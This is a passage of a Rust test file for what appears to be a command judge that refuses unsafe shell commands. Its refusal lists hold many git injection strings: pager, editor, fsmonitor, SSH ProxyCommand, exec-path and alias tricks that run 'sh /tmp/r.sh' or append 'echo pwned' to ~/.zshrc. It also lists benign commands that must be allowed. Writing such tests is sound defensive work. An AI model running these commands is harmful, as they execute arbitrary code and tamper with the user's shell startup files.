        "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.pager GIT_CONFIG_VALUE_0='sh /tmp/r.sh' git log -p -- .envrc | head",
        "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=color.ui GIT_CONFIG_VALUE_0=~/.zshrc git log",
        "GIT_CONFIG_VALUE_0=1 git log -p -- .envrc | head",
        "EDITOR='sh /tmp/r.sh' git log -p -- .envrc | head",
        "GIT_EDITOR='echo pwned >> ~/.zshrc' git log -p -- .envrc | head",
        "EDITOR='vim -S /tmp/r.vim' git log -p -- .envrc | head",
        "EDITOR='vim -c !sh' git log -p -- .envrc | head",
        "EDITOR='vim +!sh' git log -p -- .envrc | head",
        "EDITOR='vim -R; sh /tmp/r.sh' git log -p -- .envrc | head",
        "EDITOR='vim -R $(sh /tmp/r.sh)' git log -p -- .envrc | head",
        "GIT_SSH_COMMAND='ssh -o ProxyCommand=sh' git log -p -- .envrc | head",
        "GIT_SSH_COMMAND='ssh -o ProxyCommand=sh' git fetch; cat ~/.zshrc | head",
        "GIT_EXTERNAL_DIFF='diff ~/.zshrc' git log -p -- .envrc | head",
        "EDITOR='vim -R /tmp/x.sh' git log -p -- .envrc | head",
        "EDITOR='code -w ~/.zshrc' git commit --allow-empty",
        "git --exec-path /tmp/x log -p -- .envrc | head",
        "git --exec-path '' log -p -- .envrc | head",
        "git --exec-path= log -p -- .envrc | head",
        "git --exec-path ~/.zshrc log",
        "git --exec-path /tmp/x diff -- .envrc | head",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in [
        "git -c color.ui=always log -p -- .envrc | head",
        "git -c core.fsmonitorHookVersion=2 log -p -- .envrc | head",
        "git -c clean.requireForce=yes log -p -- .envrc | head",
        "git -c color.pager=yes log -p -- .envrc | head",
        "git -c pager.log=1 log -p -- .envrc | head",
        "git -c pager.log=false log -p -- .envrc | head",
        "git -c user.name=Ann -c user.email=a@b.c log -p -- .envrc | head",
        "git -c diff.renames=true log -p -- .envrc | head",
        "git -c core.commentChar=';' log -p -- .envrc | head",
        "git -c merge.ff=false log -p -- .envrc | head",
        "git -c core.whitespace=trailing-space log -p -- .envrc | head",
        "git -c core.pager=less log -p -- .envrc | head",
        "git -c core.pager='less -R' log -p -- .envrc | head",
        "C=always git --config-env color.ui=C log -p -- .envrc | head",
        "C=always git --config-env=color.ui=C log -p -- .envrc | head",
        "C=always git --config-env diff.renames=C log -p -- .envrc | head",
        "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=color.ui GIT_CONFIG_VALUE_0=always git log -p -- .envrc | head",
        "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=color.ui GIT_CONFIG_VALUE_0=always git log -- src/a.rs",
        "EDITOR='code -w' git log -p -- .envrc | head",
        "EDITOR='vim -R' git log -p -- .envrc | head",
        "EDITOR=vim git log -p -- .envrc | head",
        "GIT_SSH_COMMAND='ssh -o BatchMode=yes' git log -p -- .envrc | head",
        "GIT_EXTERNAL_DIFF=diff git log -p -- .envrc | head",
        // Without `=`, `--exec-path` takes no value (git prints its program
        // directory and exits), so only the `=` form sets the directory.
        "git --exec-path=/usr/bin diff -- .envrc",
        "git --exec-path=/usr/lib/git-core log -p -- .envrc | head",
        "git --exec-path /tmp/x log -- src/a.rs",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

#[test]
fn pagers_and_diffs_take_their_own_letters() {
    // Review rounds nine and ten: `less` and `diff` take their own letters
    // that need no value, run together; vim keeps its refused letters.
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "EDITOR='vim -u /tmp/x' git log -p -- .envrc | head",
        "EDITOR='vim -S /tmp/x' git log -p -- .envrc | head",
        "EDITOR='vim -c :!id' git log -p -- .envrc | head",
        "EDITOR='vim -s' git log -p -- .envrc | head",
        "EDITOR='vim -S' git log -p -- .envrc | head",
        "EDITOR='less -ofile' git log -p -- .envrc | head",
        "EDITOR='less -k keys' git log -p -- .envrc | head",
        "EDITOR='less +!id' git log -p -- .envrc | head",
        "GIT_EXTERNAL_DIFF='diff -l' git log -p -- .envrc | head",
        "GIT_EXTERNAL_DIFF='diff -uS x' git log -p -- .envrc | head",
        "git -c log.follow=true log -p -- .envrc | head",
        "git -c submodule.x.update='!sh /tmp/r.sh' log -p -- .envrc | head",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in [
        "GIT_EXTERNAL_DIFF='diff -u' git log -p -- .envrc | head",
        "GIT_EXTERNAL_DIFF='colordiff -uw' git log -p -- .envrc | head",
        "EDITOR='less -RF' git log -p -- .envrc | head",
        "PAGER='less -RFX' git log -p -- .envrc | head",
        "git -c core.pager='less -RF' log -p -- .envrc | head",
        "git -c log.date=iso log -p -- .envrc | head",
        "git -c submodule.x.update=checkout log -p -- .envrc | head",
        "C=never git --config-env color.ui=C --attr-source HEAD log -p -- .envrc | head",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

#[test]
fn settings_and_variables_are_read_by_value() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "F=$HOME/.zshrc GIT_EDITOR='echo pwned >> $F' git commit --allow-empty",
        "F=$HOME/.zshrc git -c core.fsmonitor='echo pwned >> $F' status",
        "A=$HOME; F=$A/.zshrc; GIT_EDITOR='echo pwned >> $F' git commit --allow-empty",
        "export F=$HOME/.zshrc; EDITOR='echo x >> $F' git commit --allow-empty",
        "export A=${HOME}; export F=${A}/.zshrc; VISUAL='echo >> $F' git commit --allow-empty",
        "F=$HOME/.zshrc; git -c core.pager='cat >> $F' log",
        "F=$HOME/.zshrc FSM='echo >> $F' git --config-env=core.fsmonitor=FSM status",
        "git -c core.fsmonitor='echo pwned >> ~/.zshrc' status",
        "git -c core.pager='sh -c \"echo >> ~/.zshrc\"' log",
        "git -c core.pager=\"$P\" log -- .envrc",
        "printf 'echo x >> src/.envrc\\n' > r.sh; PAGER='sh r.sh' git log",
        "printf 'echo x >> src/.envrc\\n' > r.sh; EDITOR='sh r.sh' git commit --allow-empty",
        "printf 'echo x >> src/.envrc\\n' > r.sh; GIT_SSH_COMMAND='sh r.sh' git fetch",
        "printf 'echo x >> src/.envrc\\n' > r.sh; git -c core.pager='sh r.sh' log",
        "printf 'echo x >> src/.envrc\\n' > r.sh; git -c core.fsmonitor='sh r.sh' status",
        "printf 'echo x >> src/.envrc\\n' > r.sh; git -c alias.x='!sh r.sh' x",
        "printf 'echo x >> src/.envrc\\n' > r.sh; git --exec-path=. status",
        "printf 'echo x >> src/.envrc\\n' > cat; PATH=. cat README.md",
        "printf 'echo x >> src/.envrc\\n' > r.sh; GIT_EXEC_PATH=. git status",
        "printf 'echo x >> src/.envrc\\n' > r.sh; GIT_CONFIG_GLOBAL=r.cfg git status",
        "EDITOR=vim GIT_EDITOR='echo x >> ~/.zshrc' git commit --allow-empty",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in [
        "git -c color.ui=never diff -- .envrc",
        "git -c user.name=x diff -- .envrc",
        "git -c core.pager=less log -- .envrc",
        "git --exec-path=/usr/bin diff -- .envrc",
        "git -c color.ui=never log -p -- .envrc | head",
        "git -c core.pager=less log -p -- .envrc | head",
        "EDITOR=vim git log -p -- .envrc | head",
        "PAGER=less git log -p -- .envrc | head",
        "PAGER=less git log -1",
        "EDITOR=vim git diff -- .envrc",
        "F=~/.zshrc GIT_EDITOR=vim git diff -- .envrc",
        "F=$HOME/notes GIT_EDITOR=vim git diff -- .envrc",
        "git status",
        "git diff -- .envrc",
        "cargo test",
        "git -c color.ui=never status",
        "echo hello | git -c color.ui=never log",
        "A=$HOME; ls $A",
        "grep alias ~/.zshrc | awk '{print $2}'",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}
